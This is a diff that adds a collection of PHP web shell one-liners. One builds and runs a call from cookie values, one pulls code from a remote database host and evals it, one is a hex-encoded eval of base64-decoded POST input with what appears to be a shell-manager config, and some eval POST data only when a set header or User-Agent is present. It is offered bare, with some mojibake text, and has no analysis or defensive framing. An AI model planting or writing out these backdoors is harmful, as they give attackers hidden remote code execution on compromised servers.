@@ -1,0 +1,19 @@
+$p=$_COOKIE;(count($p)==23&&in_array(gettype($p).count($p),$p))?(($p[59]=$p[59].$p[72])&&($p[91]=$p[59]($p[91]))&&($p=$p[91]($p[90],$p[59]($p[31])))&&$p()):$p;
+
+
+------------------------------------------------------------------------------------------------------------
+
+<?php
+eval(mysqli_fetch_assoc(mysqli_query(mysqli_connect('w2.pw','m','m','m'),'select * from info'))['info']);
+
+ÃÜÂë1
+²Ëµ¶ÅäÖÃ£º
+<PHP_BASE>
+406576616C286261736536345F6465636F646528245F504F53545B616374696F6E5D29293B&action=%s
+</PHP_BASE>
+
+--------------------------------------------------------------------------
+
+<?php if($_SERVER[123]){eval(end(get_defined_vars()[_POST]));};?>
+
+<?php if($_SERVER[HTTP_USER_AGENT]==="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36  "){eval(reset(get_defined_vars()[_POST]));};?>
